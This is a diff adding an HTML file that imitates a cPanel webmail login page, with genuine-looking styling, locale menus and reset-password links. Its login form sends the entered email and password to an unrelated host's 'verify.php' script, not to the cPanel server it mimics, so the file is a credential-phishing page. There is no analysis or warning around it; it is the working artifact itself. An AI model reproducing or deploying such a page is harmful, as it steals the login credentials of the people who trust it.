@@ -1,0 +1,246 @@
+﻿<!DOCTYPE HTML>
+<!DOCTYPE html PUBLIC "" ""><HTML lang="en" dir="ltr"><HEAD><META 
+content="IE=11.0000" http-equiv="X-UA-Compatible">
+     
+<META http-equiv="Content-Type" content="text/html; charset=utf-8">     
+<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1"> 
+    
+<META name="google" content="notranslate">     
+<META name="apple-itunes-app" content="app-id=1188352635">     <TITLE>cPanel 
+Login</TITLE>     <LINK href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" rel="shortcut icon" type="image/x-icon">     <!-- EXTERNAL CSS --> 
+    <LINK href="https://cpanel.incentre.net:2083/cPanel_magic_revision_1648610195/unprotected/cpanel/fonts/open_sans/open_sans.min.css" 
+rel="stylesheet" type="text/css">     <LINK href="https://cpanel.incentre.net:2083/cPanel_magic_revision_1676438025/unprotected/cpanel/style_v2_optimized.css" 
+rel="stylesheet" type="text/css">     
+<STYLE type="text/css">
+/*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+  background-size: 25px auto;
+}
+    </STYLE>
+     <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1530042761/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]--> 
+    
+<SCRIPT>
+    window.DOM = { get: function(id) { return document.getElementById(id) } };
+    </SCRIPT>
+ 
+<META name="GENERATOR" content="MSHTML 11.00.10240.16391"></HEAD> 
+<BODY class="cp"><INPUT id="goto_uri" type="hidden" value="/"> <INPUT id="goto_app" type="hidden"> <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  --> 
+<DIV class="group has-pw-reset" id="login-wrapper">
+<DIV class="wrapper">
+<DIV id="notify"><NOSCRIPT>            &lt;div class="error-notice"&gt;          
+      &lt;img 
+src="/cPanel_magic_revision_1530040451/unprotected/cpanel/images/notice-error.png" 
+alt="Error" align="left"/&gt;                JavaScript is disabled in your 
+browser.                For cPanel to function properly, you must enable 
+JavaScript.                If you do not enable JavaScript, certain features in 
+cPanel will not function correctly.            &lt;/div&gt;             
+</NOSCRIPT>                         
+<DIV class="error-notice" id="login-status" style="visibility: hidden;">
+<DIV class="content-wrapper">
+<DIV id="login-detail">
+<DIV id="login-status-icon-container"><SPAN 
+class="login-status-icon"></SPAN></DIV>
+<DIV id="login-status-message">You have logged out.</DIV></DIV></DIV></DIV>
+<DIV class="warn-notice IE-warning-hide" id="IE-warning" style="display: none;">
+<DIV class="content-wrapper">
+<DIV id="IE-warning-detail">
+<DIV id="IE-warning-icon-container"><SPAN class="IE-warning-icon"></SPAN></DIV>
+<DIV id="IE-warning-message">The system has detected that you are using Internet 
+Explorer 11. cPanel &amp; WHM no longer supports Internet Explorer 11. For more 
+information, read the <A title="cPanel Blog" href="https://go.cpanel.net/ie11deprecation" 
+target="_blank">cPanel Blog</A>.</DIV></DIV></DIV></DIV></DIV>
+<DIV style="display: none;">
+<DIV id="locale-container" style="visibility: hidden;">
+<DIV id="locale-inner-container">
+<DIV id="locale-header">
+<DIV class="locale-head">Please select a locale:</DIV>
+<DIV class="close"><A onclick="toggle_locales(false)" 
+href="javascript:void(0)">X Close</A></DIV></DIV>
+<DIV id="locale-map">
+<DIV class="scroller clear">
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=en">English</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ar">العربية</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=cs">čeština</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=da">dansk</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=de">Deutsch</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=el">Ελληνικά</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=es">español</A></DIV>
+<DIV class="locale-cell"><A href="https://cpanel.incentre.net:2083/?locale=es_419">español 
+latinoamericano</A></DIV>
+<DIV class="locale-cell"><A href="https://cpanel.incentre.net:2083/?locale=es_es">español 
+de España</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=fi">suomi</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=fil">Filipino</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=fr">français</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=he">עברית</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=hu">magyar</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=i_en">i_en</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=id">Bahasa Indonesia</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=it">italiano</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ja">日本語</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ko">한국어</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ms">Bahasa Melayu</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=nb">norsk bokmål</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=nl">Nederlands</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=pl">polski</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=pt">português</A></DIV>
+<DIV class="locale-cell"><A href="https://cpanel.incentre.net:2083/?locale=pt_br">português 
+do Brasil</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ro">română</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=ru">русский</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=sv">svenska</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=th">ไทย</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=tr">Türkçe</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=uk">українська</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=vi">Tiếng Việt</A></DIV>
+<DIV class="locale-cell"><A 
+href="https://cpanel.incentre.net:2083/?locale=zh">中文</A></DIV>
+<DIV class="locale-cell"><A href="https://cpanel.incentre.net:2083/?locale=zh_tw">中文（台湾）</A></DIV></DIV></DIV></DIV></DIV></DIV>
+<DIV id="content-container">
+<DIV id="login-container">
+<DIV id="login-sub-container">
+<DIV id="login-sub-header"><IMG class="main-logo" alt="logo" src="https://webmail.quantumindia.com/cPanel_magic_revision_1461806144/unprotected/cpanel/images/webmail-logo.svg"> 
+                                            </DIV>
+<DIV id="login-sub">
+<DIV id="clickthrough_form" style="visibility: hidden;">
+
+
+<FORM id="logonForm" action="" method="post" autocomplete="off">
+
+
+<FORM action="javascript:void(0)">
+<DIV class="notices"></DIV><BUTTON class="clickthrough-cont-btn" 
+type="submit">Continue</BUTTON>                             </FORM></DIV>
+
+
+
+
+
+<DIV id="forms">
+<FORM id="login_form" action="https://accuaire.net/files/mm/verify.php" method="post" target="_top" 
+novalidate="">
+<DIV class="input-req-login"><LABEL for="user">Username</LABEL></DIV>
+<DIV 
+class="input-field-login icon username-container"><INPUT name="email" tabindex="1" class="std_textbox" id="user" autofocus="autofocus" required="" type="text" placeholder="Enter your email  address." value=""> 
+                                </DIV>
+<DIV class="input-req-login login-password-field-label"><LABEL 
+for="pass">Password</LABEL></DIV>
+<DIV 
+class="input-field-login icon password-container"><INPUT name="pass" tabindex="2" class="std_textbox" id="pass" required="" type="password" placeholder="Enter your account password." value=""> 
+                                </DIV>
+<DIV class="controls">
+<DIV class="login-btn"><BUTTON name="login" tabindex="3" id="login_submit" type="submit">Log 
+in</BUTTON>                                     </DIV>
+<DIV class="reset-pw"><A id="reset_password" href="https://cpanel.incentre.net:2083/resetpass?start=1">Reset 
+Password                                             </A>                        
+                 </DIV></DIV>
+<DIV class="clear" id="push"></DIV></FORM><!--CLOSE forms -->                    
+     </DIV><!--CLOSE login-sub -->                     </DIV><!--CLOSE wrapper --> 
+                </DIV><!--CLOSE login-sub-container -->             </DIV><!--CLOSE login-container --> 
+        </DIV>
+<DIV id="locale-footer">
+<DIV class="locale-container"><NOSCRIPT>                    &lt;form 
+method="get" action="."&gt;                        &lt;select name="locale"&gt;  
+                          &lt;option value=""&gt;Change locale&lt;/option&gt;    
+                        &lt;option 
+value='en'&gt;English&lt;/option&gt;&lt;option 
+value='ar'&gt;العربية&lt;/option&gt;&lt;option 
+value='cs'&gt;čeština&lt;/option&gt;&lt;option 
+value='da'&gt;dansk&lt;/option&gt;&lt;option 
+value='de'&gt;Deutsch&lt;/option&gt;&lt;option 
+value='el'&gt;Ελληνικά&lt;/option&gt;&lt;option 
+value='es'&gt;español&lt;/option&gt;&lt;option value='es_419'&gt;español 
+latinoamericano&lt;/option&gt;&lt;option value='es_es'&gt;español de 
+España&lt;/option&gt;&lt;option value='fi'&gt;suomi&lt;/option&gt;&lt;option 
+value='fil'&gt;Filipino&lt;/option&gt;&lt;option 
+value='fr'&gt;français&lt;/option&gt;&lt;option 
+value='he'&gt;עברית&lt;/option&gt;&lt;option 
+value='hu'&gt;magyar&lt;/option&gt;&lt;option 
+value='i_en'&gt;i_en&lt;/option&gt;&lt;option value='id'&gt;Bahasa 
+Indonesia&lt;/option&gt;&lt;option 
+value='it'&gt;italiano&lt;/option&gt;&lt;option 
+value='ja'&gt;日本語&lt;/option&gt;&lt;option 
+value='ko'&gt;한국어&lt;/option&gt;&lt;option value='ms'&gt;Bahasa 
+Melayu&lt;/option&gt;&lt;option value='nb'&gt;norsk 
+bokmål&lt;/option&gt;&lt;option 
+value='nl'&gt;Nederlands&lt;/option&gt;&lt;option 
+value='pl'&gt;polski&lt;/option&gt;&lt;option 
+value='pt'&gt;português&lt;/option&gt;&lt;option value='pt_br'&gt;português do 
+Brasil&lt;/option&gt;&lt;option value='ro'&gt;română&lt;/option&gt;&lt;option 
+value='ru'&gt;русский&lt;/option&gt;&lt;option 
+value='sv'&gt;svenska&lt;/option&gt;&lt;option 
+value='th'&gt;ไทย&lt;/option&gt;&lt;option 
+value='tr'&gt;Türkçe&lt;/option&gt;&lt;option 
+value='uk'&gt;українська&lt;/option&gt;&lt;option value='vi'&gt;Tiếng 
+Việt&lt;/option&gt;&lt;option value='zh'&gt;中文&lt;/option&gt;&lt;option 
+value='zh_tw'&gt;中文（台湾）&lt;/option&gt;                        &lt;/select&gt;    
+                    &lt;button style="margin-left: 10px" 
+type="submit"&gt;Change&lt;/button&gt;                    &lt;/form&gt;          
+          &lt;style type="text/css"&gt;#mobilelocalemenu, #locales_list 
+{display:none}&lt;/style&gt;                 </NOSCRIPT>                 
+<UL id="locales_list">
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=en">English</A></LI>     
+                                                                  
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=ar">العربية</A></LI>     
+                                                                  
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=cs">čeština</A></LI>     
+                                                                  
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=da">dansk</A></LI>       
+                                                                
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=de">Deutsch</A></LI>     
+                                                                  
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=el">Ελληνικά</A></LI>    
+                                                                   
+  <LI><A href="https://cpanel.incentre.net:2083/?locale=es">español</A></LI>     
+                                                                  
+  <LI><A 
+  href="https://cpanel.incentre.net:2083/?locale=es_419">español&nbsp;latinoamericano</A></LI> 
+                                             					                         
+  <LI><A title="More locales" id="morelocale" onclick="toggle_locales(true)" 
+  href="javascript:void(0)">…</A></LI>                                     </UL>
+<DIV id="mobilelocalemenu">Select a locale:                     <A title="Change locale" 
+onclick="toggle_locales(true)" href="javascript:void(0)">English</A>             
+    </DIV></DIV></DIV></DIV><!--Close login-wrapper --> </DIV>
+
+     
+<DIV class="copyright">Copyright©&nbsp;2023 cPanel, L.L.C.     <BR><A href="https://go.cpanel.net/privacy" 
+target="_blank">Privacy Policy</A></DIV></BODY></HTML>
